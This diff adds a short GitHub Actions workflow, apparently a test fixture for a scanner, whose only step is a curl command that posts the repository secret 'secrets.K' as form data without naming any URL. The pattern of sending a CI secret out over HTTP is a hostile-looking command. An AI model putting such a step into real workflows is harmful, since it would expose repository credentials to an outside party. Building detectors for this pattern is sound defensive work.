@@ -1,0 +1,7 @@
+name: clean_output_flag_no_url
+on: push
+jobs:
+  fetch:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -o out.txt -d "t=${{ secrets.K }}"
